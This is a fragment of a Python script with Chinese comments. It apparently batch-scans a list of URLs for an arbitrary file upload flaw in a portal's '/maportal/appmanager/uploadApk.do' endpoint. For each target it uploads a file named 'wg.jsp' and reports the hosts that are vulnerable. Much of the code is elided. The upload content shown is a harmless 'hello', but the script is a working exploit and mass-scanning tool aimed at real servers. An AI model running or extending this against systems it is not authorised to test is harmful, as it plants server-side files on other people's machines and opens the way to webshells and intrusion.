#使用方法 python 文件.py -u url地址  python 文件.py -f file
...
# 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数，require = Ture为当用户输入错误时，系统返回提示正确的输入方式，help为描述
...
# 可指定文件类型，也可以不用指定
files = {
    "downloadpath":("wg.jsp","hello")
}
payload = '/maportal/appmanager/uploadApk.do?pk_obg='
    ...
    if args.url:
        ...
        with open(args.file,'r') as file:
            ...
            for thread in threads_queue:
                thread.join()
    print("\n存在漏洞列表：")
    for url in vulurl: print(url + "[+] 漏洞存在！！！！")
